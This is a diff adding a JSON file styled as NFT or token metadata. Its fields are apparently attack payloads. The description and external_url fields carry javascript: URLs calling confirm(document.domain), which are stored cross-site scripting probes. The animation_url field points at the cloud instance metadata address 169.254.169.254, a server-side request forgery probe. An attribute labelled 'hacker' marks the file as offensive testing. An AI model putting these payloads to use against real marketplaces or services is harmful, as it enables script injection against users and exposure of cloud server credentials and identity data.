@@ -1,0 +1,10 @@
+{
+	"description": "whatthe fook! [ClickMe](javascript:confirm(document.domain))",
+	"external_url": "javascript://confirm(document.domain);",
+	"image": "https://agentjacker.github.io/kittycat.png",
+	"name": "nooah",
+	"attributes": [{
+		"hacker": "wtffff"
+	}],
+	"animation_url": "http://169.254.169.254/latest/dynamic/instance-identity/document"
+}
